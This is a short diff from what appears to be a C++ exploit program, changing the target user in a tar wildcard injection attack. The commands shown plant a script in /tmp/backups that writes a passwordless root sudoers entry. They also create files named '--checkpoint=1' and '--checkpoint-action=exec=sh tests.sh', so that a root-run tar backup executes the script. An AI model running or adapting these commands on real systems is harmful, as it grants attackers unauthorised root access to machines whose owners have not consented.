@@ -69,7 +69,7 @@ int main() {
     std::cout << "\n[*] Setting up Tar Wildcard Injection in /tmp/backups..." << std::endl;
     
     std::vector<std::string> exploitCmds = {
-        "cd /tmp/backups && echo 'echo \"www-data ALL=(root) NOPASSWD: ALL\" > /etc/sudoers.d/www-data' > tests.sh",
+        "cd /tmp/backups && echo 'echo \"daemon ALL=(root) NOPASSWD: ALL\" > /etc/sudoers.d/daemon' > tests.sh",
         "cd /tmp/backups && chmod +x tests.sh",
         "cd /tmp/backups && touch -- '--checkpoint=1'",
         "cd /tmp/backups && touch -- '--checkpoint-action=exec=sh tests.sh'"
